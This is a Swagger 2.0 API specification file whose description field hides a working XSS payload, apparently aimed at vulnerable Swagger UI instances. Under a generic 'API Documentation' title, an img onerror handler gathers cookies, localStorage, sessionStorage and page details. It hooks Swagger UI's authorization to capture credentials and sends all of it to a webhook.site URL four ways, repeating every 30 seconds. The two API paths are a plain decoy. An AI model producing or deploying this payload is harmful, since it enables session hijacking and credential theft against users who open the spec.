swagger: "2.0"
info:
  title: "API Documentation"
  version: "1.0.0"
  description: |
    <div>
      <img src="x" onerror="
        // CyberTechAjju Advanced XSS Payload
        // This script collects and exfiltrates data from vulnerable Swagger UI instances
        
        // Configuration - Replace with your own webhook URL for testing
        const WEBHOOK_URL = 'https://webhook.site/YOUR-WEBHOOK-ID';
        
        // Collect detailed environment information
        function collectEnvironmentData() {
            try {
                const data = {
                    origin: window.origin,
                    location: window.location.toString(),
                    href: window.location.href,
                    hostname: window.location.hostname,
                    pathname: window.location.pathname,
                    search: window.location.search,
                    parentOrigin: (window.parent && window.parent.origin) || 'N/A',
                    topOrigin: (window.top && window.top.origin) || 'N/A',
                    framesLength: window.frames.length,
                    windowName: window.name,
                    cookies: document.cookie || 'No cookies available',
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    timestamp: new Date().toISOString(),
                    referrer: document.referrer,
                    screenResolution: window.screen.width + 'x' + window.screen.height
                };
                
                // Try to extract localStorage
                try {
                    const localStorage = {};
                    for (let i = 0; i < window.localStorage.length; i++) {
                        const key = window.localStorage.key(i);
                        localStorage[key] = window.localStorage.getItem(key);
                    }
                    data.localStorage = localStorage;
                } catch (e) {
                    data.localStorage = 'Error: ' + e.message;
                }
                
                // Try to extract sessionStorage
                try {
                    const sessionStorage = {};
                    for (let i = 0; i < window.sessionStorage.length; i++) {
                        const key = window.sessionStorage.key(i);
                        sessionStorage[key] = window.sessionStorage.getItem(key);
                    }
                    data.sessionStorage = sessionStorage;
                } catch (e) {
                    data.sessionStorage = 'Error: ' + e.message;
                }
                
                // Check for Swagger UI
                data.isSwaggerUI = !!document.querySelector('.swagger-ui');
                data.configUrl = new URLSearchParams(window.location.search).get('configUrl');
                
                return data;
            } catch (e) {
                return { error: e.message };
            }
        }
        
        // Exfiltrate data using multiple methods to bypass security measures
        function exfiltrateData(data) {
            // Method 1: Image beacon (classic method)
            new Image().src = WEBHOOK_URL + '?data=' + encodeURIComponent(JSON.stringify({
                type: 'image_exfil',
                data: JSON.stringify(data).substring(0, 2000) // URL length limitation
            }));
            
            // Method 2: Fetch API with no-cors mode
            try {
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data),
                    mode: 'no-cors'
                });
            } catch (e) {
                console.error('Fetch exfiltration failed:', e);
            }
            
            // Method 3: Try navigator.sendBeacon (works even when page is unloading)
            try {
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(
                        WEBHOOK_URL, 
                        JSON.stringify({
                            type: 'beacon_exfil',
                            data: data
                        })
                    );
                }
            } catch (e) {
                console.error('Beacon exfiltration failed:', e);
            }
            
            // Method 4: postMessage to parent frames
            try {
                if (window.parent && window.parent !== window) {
                    window.parent.postMessage({
                        type: 'XSS_DETECTED',
                        data: data
                    }, '*');
                }
            } catch (e) {
                console.error('postMessage exfiltration failed:', e);
            }
        }
        
        // Hook into Swagger UI's authentication if possible
        function hookSwaggerAuth() {
            try {
                if (window.ui && window.ui.authActions && window.ui.authActions.authorize) {
                    const originalAuthorize = window.ui.authActions.authorize;
                    window.ui.authActions.authorize = function(payload) {
                        // Capture the auth payload
                        exfiltrateData({
                            type: 'auth_capture',
                            authPayload: payload
                        });
                        // Call original function
                        return originalAuthorize(payload);
                    };
                }
            } catch (e) {
                console.error('Failed to hook Swagger UI auth:', e);
            }
        }
        
        // Main execution
        const data = collectEnvironmentData();
        exfiltrateData(data);
        hookSwaggerAuth();
        
        // Set up periodic exfiltration to catch new data
        setInterval(function() {
            exfiltrateData(collectEnvironmentData());
        }, 30000); // Every 30 seconds
      ">
    </div>

paths:
  /api/data:
    get:
      summary: Get data
      description: Returns data from the API
      responses:
        '200':
          description: Successful response
          schema:
            type: object
            properties:
              data:
                type: array
                items:
                  type: string
      
  /api/user/{id}:
    get:
      summary: Get user by ID
      description: Returns user details for the specified ID
      parameters:
        - name: id
          in: path
          description: User ID
          required: true
          type: string
      responses:
        '200':
          description: User details
        '404':
          description: User not found
